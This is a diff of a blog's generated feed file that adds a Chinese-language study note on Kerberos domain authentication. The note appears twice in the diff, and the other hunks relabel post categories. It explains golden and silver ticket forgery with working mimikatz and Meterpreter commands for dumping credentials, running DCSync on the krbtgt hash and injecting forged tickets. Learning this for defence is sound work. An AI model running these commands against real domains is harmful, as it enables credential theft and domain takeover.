+        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC]</p><h2 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h2><p>算是学习之后总结记录，加深自己的理解，这里我是参考了倾旋师傅的讲解，感觉讲的比较好，加入自己的理解和一些其他东西写下来，分享出来，也方便自己回顾知识和补充<br>还有画图的问题，我自己画的太费劲了而且也看不明白，索性我就自己手画了几个，方便自己理解和熟悉流程，感觉不错，手动狗头，哈哈</p><h2 id="0x01-Kerberos域认证"><a href="#0x01-Kerberos域认证" class="headerlink" title="0x01 Kerberos域认证"></a>0x01 Kerberos域认证</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过<a href="https://baike.baidu.com/item/密钥" target="_blank" rel="noopener">密钥</a>系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于<a href="https://baike.baidu.com/item/主机操作系统" target="_blank" rel="noopener">主机操作系统</a>的认证，无需基于<a href="https://baike.baidu.com/item/主机地址" target="_blank" rel="noopener">主机地址</a>的信任，不要求网络上所有主机的物理安全，并假定网络上传送的<a href="https://baike.baidu.com/item/数据包" target="_blank" rel="noopener">数据包</a>可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的<a href="https://baike.baidu.com/item/密码技术" target="_blank" rel="noopener">密码技术</a>（如：共享密钥）执行认证服务的。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDMxNTkucG5n?x-oss-process=image/format,png" alt="image-20200512103159200"></p><p>Kerberos的标志是三只狗头，分别代表以下角色：</p><ul><li>Client</li><li>Server</li><li>KDC(Key Distribution Center) = DC(Domain Controller)</li></ul><p><strong>名词基本概念：</strong></p><ul><li><p>KDC: Key Distribution Center，密钥分发中心，负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由AS和TGS组成。</p></li><li><p>AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</p><p>（物理方面 KDC和AD 都是一个机子）</p></li><li><p>TGT: Ticket Granting Ticket =  入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p></li><li><p>AS（Authentication Server）= 认证服务器,为client生成TGT的服务</p></li><li><p>TGS（Ticket Granting Server）= 票据授权服务器</p></li><li><p>SS（Service Server）= 特定服务提供端</p></li></ul><h2 id="域认证大致流程："><a href="#域认证大致流程：" class="headerlink" title="域认证大致流程："></a>域认证大致流程：</h2><ol><li><p>Client 上的用户请求KDC服务，最后AS服务生产TGT，返回给Client</p></li><li><p>Client 使用TGT请求KDC上的TGS得到ST（TGS ticket）真正访问的票据</p></li><li><p>Client使用ST（TGS Ticket）访问Server</p></li></ol><h2 id="第一部分：生成TGT-和-session-key"><a href="#第一部分：生成TGT-和-session-key" class="headerlink" title="第一部分：生成TGT 和  session key"></a>第一部分：生成TGT 和  session key</h2><p>1.Client发送自己的身份信息到KDC（身份信息中起码包含用户名），KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p><p>2 .KDC此时生成一个随机字符串Session Key，使用客户端的NTLM Hash加密Session Key，作为AS数据，使用KDC中krbtgt用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p><p>第一部分：获取了 TGT</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDAxMTcucG5n?x-oss-process=image/format,png" alt="image-20200512100117725"></p><p>注：客户端收到 TGT 是无法解密的，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，KDC Hash指的就是是krbtgt 的hash</p><p>这就是伪造黄金票据的原理，这个是后面还会有介绍。</p><h2 id="第二步：获取要访问的-server-ticket"><a href="#第二步：获取要访问的-server-ticket" class="headerlink" title="第二步：获取要访问的 server ticket"></a>第二步：获取要访问的 server ticket</h2><p>1.客户端使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。</p><p>如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。</p><p>2.KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。</p><p>3.验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key</p><p>这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDA1MTcucG5n?x-oss-process=image/format,png" alt="image-20200512100517747"></p><p>注释：Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。</p><h2 id="第三部-向客户端向服务器请求认证"><a href="#第三部-向客户端向服务器请求认证" class="headerlink" title="第三部 向客户端向服务器请求认证"></a>第三部 向客户端向服务器请求认证</h2><p>客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。</p><p>1 Ticket客户端无法解密，因为没有 Server hash，只能发送给 sever端</p><p>2 服务器端通过自己的hash解密Ticket，得到解密Server Session Key(Client info + Timestamp)</p><p>3 用刚刚解密的Session Key，解开Client info + Timestamp，验证客户端信息和时间戳</p><p>校验通过后，认证成功，该票据会一直存在客户端内存中，最后成功登陆</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDE2MzYucG5n?x-oss-process=image/format,png" alt="image-20200512101636849"></p><p>其中白银票据的伪造就发生在这一步的认证中，下面会介绍</p><h2 id="0x01-白银票据-Silver-Tickets"><a href="#0x01-白银票据-Silver-Tickets" class="headerlink" title="0x01 白银票据(Silver Tickets)"></a>0x01 白银票据(Silver Tickets)</h2><p>白银票据前提:</p><p>1.不需要与KDC进行交互，直接和server认证</p><p>2.需要目标服务的NTLM Hash</p><p>在第三步认证中的Ticket的组成:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMTA2MDUucG5n?x-oss-process=image/format,png" alt="image-20200512110605262"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket&#x3D;Server Hash(Server Session Key+Client info+End Time)</span><br></pre></td></tr></table></figure><p>原理：<br>如果我们拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket，直接去server端去验证。</p><p>注：服务器是不知道Server Session Key是什么的，服务器的Server Session Key是解密ticket获得的，所以一切凭据的核心在Server Hash，有了它就开业直接伪造票据认证。</p><h3 id="伪造白银票据-Silver-Tickets"><a href="#伪造白银票据-Silver-Tickets" class="headerlink" title="伪造白银票据(Silver Tickets)"></a>伪造白银票据(Silver Tickets)</h3><p>首先需要导出Server Hash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure><p>或MSF模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; msv</span><br></pre></td></tr></table></figure><p>伪造票据:</p><p>清空当前系统的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure><p>伪造票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:zeo.com &#x2F;sid:S-1-5-21-1111111111-111111111-11111111111 &#x2F;target:DC.zeo.com &#x2F;service:CIFS &#x2F;rc4:7c4a8d09ca3762af61e59520943dc26494f8941b &#x2F;user:admin &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>验证权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:</p><table><thead><tr><th>服务注释</th><th>服务名</th></tr></thead><tbody><tr><td>WMI</td><td>HOST、RPCSS</td></tr><tr><td>Powershell Remoteing</td><td>HOST、HTTP</td></tr><tr><td>WinRM</td><td>HOST、HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>LDAP 、DCSync</td><td>LDAP</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>Windows Remote ServerAdministration Tools</td><td>RPCSS、LDAP、CIFS</td></tr></tbody></table><h2 id="0x02-黄金票据（Golden-Ticket）"><a href="#0x02-黄金票据（Golden-Ticket）" class="headerlink" title="0x02 黄金票据（Golden Ticket）"></a>0x02 黄金票据（Golden Ticket）</h2><p>黄金票据前提:</p><p>1.需要与DC通信</p><p>2.需要krbtgt用户的hash（也就是说要拿下域控制器）</p><p>黄金票据原理：</p><p>就是伪造的TGT，它会在第二步认证被发送到KDC的TGS，如果我们有了krbtgt用户的hash就可以直接伪造TGT，其中的KDC需要的session key，是KDC解密TGT之后获取的，所以session key也是和TGT一起伪造的，那么后续的认证，就可以随意的制造想要的票据了。</p><h3 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h3><p>管理员权限运行mimikatz，获取关键krbtgt hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync &#x2F;user:krbtgt&quot; exit</span><br></pre></td></tr></table></figure><p>获取域中所有用户SID</p><p>只要是域用户权限就行，去掉SID最后的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p>清空现有票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; exit</span><br></pre></td></tr></table></figure><p>生成票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域SID&gt; &#x2F;rc4:&lt;KRBTGT NTLM Hash&gt; &#x2F;user:&lt;任意用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>还有一个简单的用法，cobalt strike中直接有一项黄金票据生产，十分方便。</p><p>将票据注入内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt Administrator.kiribi&quot; exit</span><br></pre></td></tr></table></figure><p>当前会话中的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::tgt&quot; exit</span><br></pre></td></tr></table></figure><p>权限验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><h2 id="0x03-黄金票据和白银票据比较"><a href="#0x03-黄金票据和白银票据比较" class="headerlink" title="0x03 黄金票据和白银票据比较"></a>0x03 黄金票据和白银票据比较</h2><table><thead><tr><th align="left"></th><th>黄金票据</th><th>白银票据</th></tr></thead><tbody><tr><td align="left">访问权限</td><td>伪造TGT，可以获取任何Kerberos服务权限</td><td>伪造TGS，只能访问指定的服务</td></tr><tr><td align="left">加密方式</td><td>由Kerberos的Hash加密</td><td>Silver Ticket由服务账号Hash加密</td></tr><tr><td align="left">认证流程</td><td>需要访问域控认证，属于第二步认证</td><td>直接和服务器认，最后一步认证</td></tr></tbody></table><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-11-30/1</a>  </p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 内网安全研究 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>内网安全:Kerberos域认证流程---黄金票据和白银票据</title>
+      <link href="/2020/05/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/"/>
+      <url>/2020/05/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</url>
       
         <content type="html"><![CDATA[<a id="more"></a><p>@[TOC]</p><h2 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h2><p>算是学习之后总结记录，加深自己的理解，这里我是参考了倾旋师傅的讲解，感觉讲的比较好，加入自己的理解和一些其他东西写下来，分享出来，也方便自己回顾知识和补充<br>还有画图的问题，我自己画的太费劲了而且也看不明白，索性我就自己手画了几个，方便自己理解和熟悉流程，感觉不错，手动狗头，哈哈</p><h2 id="0x01-Kerberos域认证"><a href="#0x01-Kerberos域认证" class="headerlink" title="0x01 Kerberos域认证"></a>0x01 Kerberos域认证</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过<a href="https://baike.baidu.com/item/密钥" target="_blank" rel="noopener">密钥</a>系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于<a href="https://baike.baidu.com/item/主机操作系统" target="_blank" rel="noopener">主机操作系统</a>的认证，无需基于<a href="https://baike.baidu.com/item/主机地址" target="_blank" rel="noopener">主机地址</a>的信任，不要求网络上所有主机的物理安全，并假定网络上传送的<a href="https://baike.baidu.com/item/数据包" target="_blank" rel="noopener">数据包</a>可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的<a href="https://baike.baidu.com/item/密码技术" target="_blank" rel="noopener">密码技术</a>（如：共享密钥）执行认证服务的。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDMxNTkucG5n?x-oss-process=image/format,png" alt="image-20200512103159200"></p><p>Kerberos的标志是三只狗头，分别代表以下角色：</p><ul><li>Client</li><li>Server</li><li>KDC(Key Distribution Center) = DC(Domain Controller)</li></ul><p><strong>名词基本概念：</strong></p><ul><li><p>KDC: Key Distribution Center，密钥分发中心，负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由AS和TGS组成。</p></li><li><p>AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</p><p>（物理方面 KDC和AD 都是一个机子）</p></li><li><p>TGT: Ticket Granting Ticket =  入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p></li><li><p>AS（Authentication Server）= 认证服务器,为client生成TGT的服务</p></li><li><p>TGS（Ticket Granting Server）= 票据授权服务器</p></li><li><p>SS（Service Server）= 特定服务提供端</p></li></ul><h2 id="域认证大致流程："><a href="#域认证大致流程：" class="headerlink" title="域认证大致流程："></a>域认证大致流程：</h2><ol><li><p>Client 上的用户请求KDC服务，最后AS服务生产TGT，返回给Client</p></li><li><p>Client 使用TGT请求KDC上的TGS得到ST（TGS ticket）真正访问的票据</p></li><li><p>Client使用ST（TGS Ticket）访问Server</p></li></ol><h2 id="第一部分：生成TGT-和-session-key"><a href="#第一部分：生成TGT-和-session-key" class="headerlink" title="第一部分：生成TGT 和  session key"></a>第一部分：生成TGT 和  session key</h2><p>1.Client发送自己的身份信息到KDC（身份信息中起码包含用户名），KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p><p>2 .KDC此时生成一个随机字符串Session Key，使用客户端的NTLM Hash加密Session Key，作为AS数据，使用KDC中krbtgt用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p><p>第一部分：获取了 TGT</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDAxMTcucG5n?x-oss-process=image/format,png" alt="image-20200512100117725"></p><p>注：客户端收到 TGT 是无法解密的，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，KDC Hash指的就是是krbtgt 的hash</p><p>这就是伪造黄金票据的原理，这个是后面还会有介绍。</p><h2 id="第二步：获取要访问的-server-ticket"><a href="#第二步：获取要访问的-server-ticket" class="headerlink" title="第二步：获取要访问的 server ticket"></a>第二步：获取要访问的 server ticket</h2><p>1.客户端使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。</p><p>如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。</p><p>2.KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。</p><p>3.验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key</p><p>这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDA1MTcucG5n?x-oss-process=image/format,png" alt="image-20200512100517747"></p><p>注释：Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。</p><h2 id="第三部-向客户端向服务器请求认证"><a href="#第三部-向客户端向服务器请求认证" class="headerlink" title="第三部 向客户端向服务器请求认证"></a>第三部 向客户端向服务器请求认证</h2><p>客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。</p><p>1 Ticket客户端无法解密，因为没有 Server hash，只能发送给 sever端</p><p>2 服务器端通过自己的hash解密Ticket，得到解密Server Session Key(Client info + Timestamp)</p><p>3 用刚刚解密的Session Key，解开Client info + Timestamp，验证客户端信息和时间戳</p><p>校验通过后，认证成功，该票据会一直存在客户端内存中，最后成功登陆</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDE2MzYucG5n?x-oss-process=image/format,png" alt="image-20200512101636849"></p><p>其中白银票据的伪造就发生在这一步的认证中，下面会介绍</p><h2 id="0x01-白银票据-Silver-Tickets"><a href="#0x01-白银票据-Silver-Tickets" class="headerlink" title="0x01 白银票据(Silver Tickets)"></a>0x01 白银票据(Silver Tickets)</h2><p>白银票据前提:</p><p>1.不需要与KDC进行交互，直接和server认证</p><p>2.需要目标服务的NTLM Hash</p><p>在第三步认证中的Ticket的组成:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMTA2MDUucG5n?x-oss-process=image/format,png" alt="image-20200512110605262"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket&#x3D;Server Hash(Server Session Key+Client info+End Time)</span><br></pre></td></tr></table></figure><p>原理：<br>如果我们拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket，直接去server端去验证。</p><p>注：服务器是不知道Server Session Key是什么的，服务器的Server Session Key是解密ticket获得的，所以一切凭据的核心在Server Hash，有了它就开业直接伪造票据认证。</p><h3 id="伪造白银票据-Silver-Tickets"><a href="#伪造白银票据-Silver-Tickets" class="headerlink" title="伪造白银票据(Silver Tickets)"></a>伪造白银票据(Silver Tickets)</h3><p>首先需要导出Server Hash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure><p>或MSF模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; msv</span><br></pre></td></tr></table></figure><p>伪造票据:</p><p>清空当前系统的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure><p>伪造票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:zeo.com &#x2F;sid:S-1-5-21-1111111111-111111111-11111111111 &#x2F;target:DC.zeo.com &#x2F;service:CIFS &#x2F;rc4:7c4a8d09ca3762af61e59520943dc26494f8941b &#x2F;user:admin &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>验证权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:</p><table><thead><tr><th>服务注释</th><th>服务名</th></tr></thead><tbody><tr><td>WMI</td><td>HOST、RPCSS</td></tr><tr><td>Powershell Remoteing</td><td>HOST、HTTP</td></tr><tr><td>WinRM</td><td>HOST、HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>LDAP 、DCSync</td><td>LDAP</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>Windows Remote ServerAdministration Tools</td><td>RPCSS、LDAP、CIFS</td></tr></tbody></table><h2 id="0x02-黄金票据（Golden-Ticket）"><a href="#0x02-黄金票据（Golden-Ticket）" class="headerlink" title="0x02 黄金票据（Golden Ticket）"></a>0x02 黄金票据（Golden Ticket）</h2><p>黄金票据前提:</p><p>1.需要与DC通信</p><p>2.需要krbtgt用户的hash（也就是说要拿下域控制器）</p><p>黄金票据原理：</p><p>就是伪造的TGT，它会在第二步认证被发送到KDC的TGS，如果我们有了krbtgt用户的hash就可以直接伪造TGT，其中的KDC需要的session key，是KDC解密TGT之后获取的，所以session key也是和TGT一起伪造的，那么后续的认证，就可以随意的制造想要的票据了。</p><h3 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h3><p>管理员权限运行mimikatz，获取关键krbtgt hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync &#x2F;user:krbtgt&quot; exit</span><br></pre></td></tr></table></figure><p>获取域中所有用户SID</p><p>只要是域用户权限就行，去掉SID最后的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p>清空现有票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; exit</span><br></pre></td></tr></table></figure><p>生成票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域SID&gt; &#x2F;rc4:&lt;KRBTGT NTLM Hash&gt; &#x2F;user:&lt;任意用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>还有一个简单的用法，cobalt strike中直接有一项黄金票据生产，十分方便。</p><p>将票据注入内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt Administrator.kiribi&quot; exit</span><br></pre></td></tr></table></figure><p>当前会话中的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::tgt&quot; exit</span><br></pre></td></tr></table></figure><p>权限验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><h2 id="0x03-黄金票据和白银票据比较"><a href="#0x03-黄金票据和白银票据比较" class="headerlink" title="0x03 黄金票据和白银票据比较"></a>0x03 黄金票据和白银票据比较</h2><table><thead><tr><th align="left"></th><th>黄金票据</th><th>白银票据</th></tr></thead><tbody><tr><td align="left">访问权限</td><td>伪造TGT，可以获取任何Kerberos服务权限</td><td>伪造TGS，只能访问指定的服务</td></tr><tr><td align="left">加密方式</td><td>由Kerberos的Hash加密</td><td>Silver Ticket由服务账号Hash加密</td></tr><tr><td align="left">认证流程</td><td>需要访问域控认证，属于第二步认证</td><td>直接和服务器认，最后一步认证</td></tr></tbody></table><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-11-30/1</a>  </p>]]></content>
       
@@ -89,7 +203,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -133,7 +247,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -158,7 +272,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -177,7 +291,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 代码审计 </category>
           
       </categories>
       
@@ -196,7 +310,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -215,7 +329,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 代码审计 </category>
           
       </categories>
       
@@ -310,7 +424,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -481,7 +595,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 利用 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -538,7 +652,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 代码审计 </category>
+          <category> WEB 漏洞复现和分析 代码审计 </category>
           
       </categories>
       
@@ -576,7 +690,7 @@
       
       <categories>
           
-          <category> 配环境 </category>
+          <category> 配环境 安全开发 </category>
           
       </categories>
       
@@ -671,7 +785,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -690,7 +804,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -709,7 +823,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -772,7 +886,7 @@
       
       <categories>
           
-          <category> 漏洞复现和分析 </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
@@ -791,7 +905,7 @@
       
       <categories>
           
-          <category> weblogic </category>
+          <category> WEB 漏洞复现和分析 </category>
           
       </categories>
       
